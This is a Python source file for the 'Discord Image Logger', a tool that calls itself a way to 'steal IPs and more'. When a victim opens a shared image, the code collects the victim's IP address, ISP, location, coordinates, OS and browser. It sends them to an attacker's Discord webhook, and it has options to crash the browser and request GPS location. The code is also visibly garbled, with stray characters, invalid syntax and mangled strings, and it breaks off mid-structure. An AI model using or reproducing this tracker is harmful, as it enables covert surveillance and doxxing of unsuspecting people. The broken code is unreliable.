# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

_app_ = "Discord Image Logger"
__description = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
_version = "v2.0"
_author = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://notepad-plus-plus.org/assets/images/notepad4ever.png",  # You can also have a custom image by using a URL argument
    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION # 
    "username": "Image Logger",  # Set this to the name you want the webhook to have
    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False,  # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    "accurateLocation": False,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": {  # Show a custom message when the user opens the image
        "doMessage": False,  # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
        "richMessage": True,  # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1,  # Prevents VPNs from triggering the alert
    "linkAlerts": True,  # Alert when someone sends the link
    "buggedImage": True,  # Shows a loading image as the preview
    "antiBot": 1.,  # Prevents bots from triggering the alert

    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect to a webpage?
        "page": "https://your-link.here"  # Link to the webpage to redirect
    },
}

blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IPs

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startsWith("TelegramBot"):
        return "Telegram"
    else:
        return False

く def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error: **\n```\n{error}\n```",
            }
        ],
    })

▼ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklisted IPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon. \n\n**Endpoint:** `{endpoint}` \n**IP:** `{ip}` \n**Platform"
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if infor"proxy"1:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger IP Logged",
                "color": config["color"],
                "description": "*"**A User Opened the Original Image!**

**Endpoint:** *{endpoint}

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}'
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}"
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** *{info['regionName'] if info['regionName'] else 'Unknown"}'
> **City:** *{info['city'] if info['city'] else 'Unknown'}'
> **Coords:** *{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++*+coords+
> **Timezone:** {info['timezone'].split('/')[1].replace('_', ')} ({info['timezone'].split('/')[0]}}`
> **Mobile:** `{info['mobile']}`
> **VPN:** *{info['proxy']}`
> **Bot:** *{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False"}

**PC Info:**
> **05:** `{os}`
> **Browser:** `{browser}`

**User Agent:**

{useragent}

            }
        ],
    }
